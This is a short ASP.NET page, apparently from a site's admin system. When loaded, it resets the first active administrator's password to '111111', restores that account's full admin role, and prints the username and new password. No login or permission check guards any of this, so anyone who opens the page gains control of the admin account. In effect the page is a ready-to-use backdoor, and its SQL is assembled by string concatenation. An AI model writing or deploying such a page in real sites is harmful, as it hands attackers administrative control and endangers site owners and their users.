<%@ Page Language="C#" %>
<%
    
System.Data.SqlClient.SqlDataReader rs=Helper.Sql.ExecuteReader("select top 1 id,uname from m_admin where (permissions='[1]' or id in (select userid from admin_role where roleid=1)) and status=1");
            if (rs.Read())
            {
 		Helper.Sql.ExecuteNonQuery("update  m_admin set pword='"+"111111".Encryption(MWMS.Config.webId).MD5()+"' where id=" + rs[0].ToString());
		Helper.Sql.ExecuteNonQuery("delete from admin_role where userid="+rs[0].ToString());
		Helper.Sql.ExecuteNonQuery("insert into admin_role (id,userId,roleId)values("+MWMS.API.GetId()+","+rs[0].ToString()+",1)");
Response.Write(rs[1].ToString()+"<br>111111");
            }
            rs.Close();
%>